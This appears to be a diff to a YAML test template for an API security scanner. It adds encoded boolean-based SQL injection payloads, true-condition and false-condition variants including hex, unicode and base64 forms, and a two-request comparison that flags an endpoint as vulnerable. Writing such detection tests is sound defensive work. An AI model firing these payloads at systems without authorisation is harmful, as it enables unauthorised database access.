@@ -86,44 +86,92 @@ wordLists:
     - "%27%20OR%20%271%27%3D%271"
     - "' OR ASCII('1')=49"
     - "' OR 1=1 -- -"
+  encodingNegativePayloads:
+    - "' OR 0x31<>0x31"
+    - " JyBvciAxPTAtLQ=="
+    - "' OR '\u0031'<>'\u0031"
+    - "' OR U&'\\0061'<>'a"
+    - "%27%20OR%20%271%27%3D%270"
+    - "' OR ASCII('1')<>49"
+    - "' OR 1<>1 -- -"
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_body_param:
         userKey: ${userVal}${encodingPayloads}
-        
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Error
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${encodingNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0  
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts    
+          neq: "${x1.response.body}"
+    - success: vulnerable
